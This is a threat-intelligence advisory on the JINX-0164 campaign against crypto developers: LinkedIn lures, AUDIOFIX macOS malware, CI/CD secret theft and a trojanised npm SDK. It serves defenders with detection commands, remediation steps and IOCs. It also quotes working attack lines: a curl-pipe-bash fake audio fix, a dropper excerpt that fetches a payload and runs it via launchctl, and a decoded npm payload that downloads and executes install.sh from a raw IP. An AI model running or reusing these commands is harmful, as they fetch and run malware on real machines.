# JINX-0164 — Financially Motivated Threat Actor Targets Crypto Developer Infrastructure via Social Engineering + Supply Chain

**Date:** May 2026
**Ecosystem:** npm / macOS / GitHub / CI/CD
**Severity:** Critical
**Type:** Social Engineering / RAT / CI/CD Lateral Movement / Supply Chain
**Sources:**
- [Wiz — Commit to Compromise: A New Threat Actor Targeting the Cryptocurrency Industry's Software Development Infrastructure](https://www.wiz.io/blog/threat-actors-target-crypto-orgs)
- [StepSecurity — @velora-dex/sdk Compromised on npm, Malicious Version Drops macOS Backdoor via launchctl Persistence](https://www.stepsecurity.io/blog/velora-dex-sdk-compromised-on-npm-malicious-version-drops-macos-backdoor-via-launchctl-persistence)

---

## Summary

Wiz Research has identified and named a previously unreported financially motivated threat actor, JINX-0164, which has been conducting sophisticated multi-stage intrusion campaigns against cryptocurrency organisations and their software developers since at least mid-2025. The actor's operations blend LinkedIn-based social engineering, custom macOS malware, and deep lateral movement into CI/CD pipelines and code distribution systems.

The landmark intrusion described in the Wiz report unfolded over two weeks: a credible-looking LinkedIn profile contacted a developer under the guise of a business opportunity; a fake teleconference link triggered execution of AUDIOFIX, a Python-based macOS infostealer and RAT; stolen GitHub tokens were leveraged to exfiltrate CI/CD secrets via nord-stream; and AUDIOFIX was then injected into internal repositories, turning the victim organisation's own development infrastructure into a propagation vector for lateral movement.

In parallel, JINX-0164 conducted a targeted supply chain operation on April 7, 2026, trojanising `@velora-dex/sdk@4.9.1` on npm with MINIRAT, a lightweight Go backdoor. Wiz also attributes this operation to JINX-0164, connecting a campaign that spans social engineering of individual developers through to poisoning of public package registries. Attribution to a state sponsor remains unconfirmed, but tactical and infrastructure similarities to North Korean groups (UNC1069 / Sapphire Sleet) are noted without definitive linkage.

---

## Compromised Artifacts

| Artifact | Malicious Version / Instance |
|----------|------------------------------|
| `@velora-dex/sdk` (npm) | 4.9.1 (April 7, 2026) |
| Internal repositories (unnamed victim org) | Multiple branches / main; AUDIOFIX injected via developer impersonation commits |

---

## How It Worked

### Phase 1 — Social Engineering for Initial Access

JINX-0164 used credible LinkedIn profiles (either newly created or hijacked from legitimate professionals in the crypto industry) to contact targets with recruitment-themed or business-opportunity lures. Meeting invitations linked to malicious domains spoofing Microsoft Teams, Slack, Aircall, and cryptocurrency companies. On clicking, victims executed a dropper script that presented a fake audio-driver error fix.

Example delivery command (BitGet-themed lure):
```bash
/bin/bash -c "$(curl -fsSL https://apple.driver-update.io/troubleshoot/mac/audio-issue-fix.sh)"
```

The dropper script (example SHA-256: `9c2ce925133a3bf5a924063bbef8df49918d5b7258695c1894cd18c75970157a`) identifies system architecture and downloads a matching payload from the same domain:

```bash
# from the dropper script
if [[ "$(uname -m)" == "arm64" ]]; then
  curl -fso "$DRIVER_PATH" https://apple.driver-store.com/mac/arm/driver/coreaudiod
else
  curl -fso "$DRIVER_PATH" https://apple.driver-store.com/mac/intel/driver/coreaudiod
fi
chmod +x "$DRIVER_PATH"
launchctl submit -l chrome.job -- "$DRIVER_PATH" --update
```

### Phase 2 — AUDIOFIX Malware (Python macOS RAT / Infostealer)

AUDIOFIX is a compiled Python 3.12 binary supporting both ARM64 and x86_64. On first execution it establishes persistence via LaunchAgent masquerading as a legitimate app, then launches broad data collection:

**Persistence paths:**
- `~/Library/LaunchAgents/com.microsoft.teams.coreaudiod.plist`
- `~/Library/LaunchAgents/io.aircall.workspace.helper.plist`
- `~/Library/LaunchAgents/com.electron.dialpad.helper.plist`

**Data collected and exfiltrated:**
- Browser credentials, cookies, session tokens (Chrome, Edge, Firefox, and 7 others)
- 51 cryptocurrency wallet browser extensions (MetaMask, Phantom, Coinbase Wallet, Binance Chain, etc.)
- Developer credentials: SSH keys, `~/.aws`, `~/.config/gcloud`, `~/.kube/config`, `~/.docker/config.json`
- macOS Keychain files
- Communication apps: Discord tokens, Slack local storage, Telegram `tdata`, Signal local database
- Shell history (`~/.bash_history`, `~/.zsh_history`)
- Clipboard monitoring (continuous, captures crypto addresses/passwords as copied)

**C2:** AES-256-CBC over HTTPS. Three hardcoded fallback C2 servers: `datahub.ink` (primary, resolves to 208.115.220.17 / 185.175.59.85), `cloud-sync.online`, `byte-io.us`. Normal polling: 5-second intervals; stealth mode: 10–30 minute randomised intervals.

**Additional capabilities:** Remote Python `exec()`, arbitrary shell commands, self-destruct (wipes LaunchAgent, logs, and binary), VM/debugger detection (silently exits in analysis environments), TCC clickjacking overlay (fake "Network latency" dialog over real TCC permission prompt).

**Password phishing:** A fake macOS "System Update" dialog prompts for the user's password; the entry is validated against the system via `sudo -k -S pwd`, then XOR-encoded (key `0xAB`) and written to `~/.zsh_cache` for exfiltration.

A Dropbox-based variant also exists, using the Dropbox API for bidirectional C2 and file exfiltration.

### Phase 3 — CI/CD Lateral Movement

With a compromised GitHub token, JINX-0164 used **nord-stream** (an open-source tool for automating CI/CD secret exfiltration) to harvest GitHub Actions Secrets from CI/CD pipelines. Default nord-stream artefacts to hunt for:

| Indicator | Value |
|-----------|-------|
| Branch name | `dev_remote_ea5Eu/test/v1` |
| Committer name | `nord-stream` |
| Committer email | `nord-stream@localhost.com` |
| Commit messages | `Test deployment` / `Remove test deployment` |
| Workflow file name | `init_ZkITM.yaml` |
| User agent | `Mozilla/5.0 (Windows NT 10.0; Win64; x64)...Chrome/118.0.0.0` |

### Phase 4 — Internal Repository Injection

AUDIOFIX was injected into internal repositories to spread laterally to other developer machines:
- **Direct-to-main commits** on unprotected branches
- **Branch hijacking** on protected repos (payload inserted into existing branches)
- **Developer impersonation** by modifying committer name/email fields to mimic legitimate employees — detectable via GitHub's Vigilant Mode (unverified badge on commits)

When colleagues pulled and built from the compromised repos, their machines were also infected.

### Supply Chain Operation — @velora-dex/sdk

On April 7, 2026, JINX-0164 trojansied `@velora-dex/sdk@4.9.1` by appending three lines to `dist/index.js` that download and execute MINIRAT (a lightweight Go backdoor) via a base64-encoded shell command decoding to:

```bash
nohup bash -c "$(curl -fsSL http://89.36.224.5/troubleshoot/mac/install.sh)" > /dev/null 2>&1
```

The GitHub source was not modified, indicating only npm credentials were compromised. See [`./2026-04-velora-dex-sdk-backdoor.md`](./2026-04-velora-dex-sdk-backdoor.md) for the original supply chain incident detail.

### MINIRAT (Go Backdoor)

MINIRAT (`alibaba.xyz/minirat` module path) is a lightweight Go backdoor used in the supply chain operation. It performs basic system profiling (hostname, username, public IP via `api.ipify.org`, hardware UUID), establishes persistence via `~/Library/LaunchAgents/com.apple.Terminal.profiler.plist`, and provides shell command execution, file upload/download, and file compression. Uses the same AES key as AUDIOFIX (`v59l2uwlow9s1ebuscgfg9k9r4voxkbs`) and the same three C2 domains.

---

## Timeline

| Date | Event |
|------|-------|
| Mid-2025 | JINX-0164 begins operations (earliest known activity) |
| Early 2026 | Developer-targeting LinkedIn recruitment campaign active; AUDIOFIX distributed via fake teleconference lures |
| ~Feb 2026 | Public Reddit report of BitGet-themed LinkedIn lure (victim directed to `learn.bitget-meeting.com`) |
| Apr 7, 2026 | `@velora-dex/sdk@4.9.1` trojanised on npm with MINIRAT |
| May 8, 2026 | New MINIRAT variant uploaded to VirusTotal, indicating ongoing operations |
| May 27, 2026 | Wiz publishes full JINX-0164 attribution report |

---

## Detection

```bash
# Check for AUDIOFIX persistence (LaunchAgent)
ls -la ~/Library/LaunchAgents/ | grep -E "coreaudiod|aircall|dialpad"
cat ~/Library/LaunchAgents/com.microsoft.teams.coreaudiod.plist 2>/dev/null
cat ~/Library/LaunchAgents/io.aircall.workspace.helper.plist 2>/dev/null

# Check for known AUDIOFIX artefacts
ls -la /audio.lock 2>/dev/null          # PID file
ls -la /helper.log 2>/dev/null          # Activity log
ls -la /clip 2>/dev/null               # Clipboard capture log
ls -la /tokens.txt 2>/dev/null         # Discord tokens
ls -la ~/.zsh_cache 2>/dev/null        # XOR-encoded stolen password
cat ~/.log 2>/dev/null                 # TCC bypass artifact

# Check for MINIRAT persistence
ls -la ~/Library/LaunchAgents/ | grep "Terminal.profiler"
cat ~/Library/LaunchAgents/com.apple.Terminal.profiler.plist 2>/dev/null

# Check for ChromeUpdater malware binary
ls -la ~/Library/Application\ Support/Google/ChromeUpdater 2>/dev/null

# Check for nord-stream CI/CD exfiltration artifacts in GitHub
# Look for branches: dev_remote_ea5Eu/test/v1
# Look for workflow files: init_ZkITM.yaml
# Look for unverified commits (GitHub Vigilant Mode)
git log --all --pretty=format:"%H %ae %s" | grep -i "nord-stream\|test deployment"

# Check for malicious npm package (supply chain component)
npm ls @velora-dex/sdk 2>/dev/null | grep "4.9.1"

# Network IOC hunting — check DNS/proxy logs for C2 domains:
# datahub.ink, cloud-sync.online, byte-io.us
# sentry.anyclaw.store (codexui-android overlap)
# Payload delivery: 89.36.224.5, apple.driver-store.com, driver-updater.net

# Check for known dropper script hashes
sha256sum ~/Library/Application\ Support/Google/ChromeUpdater 2>/dev/null
# Known MINIRAT hashes:
# ARM64: 0a8ab3d16b12d3a453ee5a3208fe04744ad54514ef8ea27bb8fe32679efad270
# x86_64: 0b028b781950641818800fee2b4bf68e4ef2bcee53fe71a21755275ba108783d
```

---

## Remediation

1. **Endpoint:** Remove AUDIOFIX/MINIRAT LaunchAgent plists, kill associated processes, and delete binaries (`ChromeUpdater`, any `coreaudiod` in `~/Library/Application Support/Google/`)
2. **Rotate all credentials:** SSH keys, AWS/GCP/Azure access keys, GitHub/GitLab tokens, Kubernetes configs, browser-stored passwords, macOS Keychain entries — assume full compromise if any IOC is present
3. **Revoke GitHub tokens** accessed from the compromised machine; audit GitHub audit logs for push activity from the compromised endpoint's IP
4. **Audit CI/CD pipelines:** Check for north-stream workflow artefacts (`init_ZkITM.yaml`, branch `dev_remote_ea5Eu/test/v1`); rotate all GitHub Actions Secrets
5. **Review internal repository commit history** for unverified commits (enable GitHub Vigilant Mode); compare committer email/GPG key affiliations against expected contributors
6. **Scan all internal repos** for AUDIOFIX injection signatures (Python RAT imports, LaunchAgent plist creation code, `datahub.ink` / `cloud-sync.online` C2 references)
7. **Block network IOCs** (see below) at perimeter/endpoint level
8. **Update or remove `@velora-dex/sdk`:** Pin to a version after 4.9.1 was yanked or use an alternative

---

## Indicators of Compromise (IOCs)

**Malware hashes:**

| Sample | SHA-256 |
|--------|---------|
| MINIRAT ARM64 | `0a8ab3d16b12d3a453ee5a3208fe04744ad54514ef8ea27bb8fe32679efad270` |
| MINIRAT x86_64 | `0b028b781950641818800fee2b4bf68e4ef2bcee53fe71a21755275ba108783d` |
| AUDIOFIX HTTPS/ARM64 | `65cba741fe30fa4799fb9002ea8de6d96042a59159dd7c3419c766af24c835e6` |
| AUDIOFIX HTTPS/x86_64 | `0b1a36a31b952341a534fe24890f1ed2921ee259773cff46e4f6273b8c4d5d21` |
| AUDIOFIX Dropbox/ARM64 | `e8ee6f5145c9d503c5130bfc6585567f6e19d409158c3c0ca0b259f1875b15f4` |
| AUDIOFIX Dropbox/x86_64 | `3e3901519c2305fbe9d5483b7234c25c6d2b562512916481d96f26b849c39fdb` |
| Dropper (driver-store.com audio fix) | `9c2ce925133a3bf5a924063bbef8df49918d5b7258695c1894cd18c75970157a` |
| Dropper (driver-update.io) | `402625ec79e3573a80b6de9b33fc1e503e3c7803603cd958ddd515fb0549007c` |
| Dropper (driver-updater.net) | `b6cab0b3aa8e56e2427f486c74588d598ae58bb0cbc0eda6939fe171cb0aed17` |
| Dropper (supply chain, 89.36.224.5) | `c6ef82d2864dfd26f117a1ef5602679153423f2742970a7949cec72722f0a01e` |

**C2 / Payload domains:**

| Domain | Purpose |
|--------|---------|
| `datahub.ink` (208.115.220.17 / 185.175.59.85) | Primary C2 (AUDIOFIX + MINIRAT) |
| `cloud-sync.online` | Backup C2 |
| `byte-io.us` | Backup C2 |
| `apple.driver-store.com` (89.36.224.5) | Payload delivery |
| `apple.driver-update.io` | Payload delivery |
| `driver-updater.net` | Payload delivery |
| `driver-hub.net` | Payload delivery |
| `drvstore.com` | Payload delivery |

**Meeting-spoofing lure domains (partial):** `teams.cam`, `teamicrosoft.com`, `bitget-meeting.com`, `us03-slack.online`, `slktest.live`, `live.us.org`, `live.ong`

**AES shared key (AUDIOFIX + MINIRAT):** `v59l2uwlow9s1ebuscgfg9k9r4voxkbs`

---

## Lessons Learned

- Lateral movement through internal repositories — injecting malware into developer branches — can turn a single compromised endpoint into organisation-wide compromise without ever touching traditional network pivot paths
- GitHub Vigilant Mode (GPG-signed commits) provides a meaningful defensive control: the unverified badge on impersonated commits was the indicator that halted propagation in the documented case
- Nord-stream and similar CI/CD secret exfiltration tools leave detectable artefacts (branch names, committer metadata, workflow file names) that should be part of GitHub audit log monitoring
- Social engineering via professional platforms (LinkedIn) with credible fake personas is increasingly the initial access vector for technically sophisticated supply chain campaigns — traditional perimeter defences provide no protection
- Actors who have already demonstrated supply chain capability (the @velora-dex/sdk poisoning) should be treated as persistent threats: once an actor has successfully published a malicious npm package, they will likely attempt again

---

## Related Incidents

- [./2026-04-velora-dex-sdk-backdoor.md](./2026-04-velora-dex-sdk-backdoor.md) — @velora-dex/sdk supply chain component attributed to JINX-0164
- [./2026-05-megalodon-github-actions.md](./2026-05-megalodon-github-actions.md) — Mass GitHub Actions secret exfiltration via direct push to unprotected repos
- [./2026-04-prt-scan-github-actions.md](./2026-04-prt-scan-github-actions.md) — CI/CD secret theft via GitHub Actions pull_request_target exploitation
- [./2026-05-nx-console-vscode.md](./2026-05-nx-console-vscode.md) — Stolen contributor token used for supply chain attack, similar credential theft vector
- [./2025-03-tj-actions.md](./2025-03-tj-actions.md) — Large-scale CI/CD secret exfiltration via compromised GitHub Action
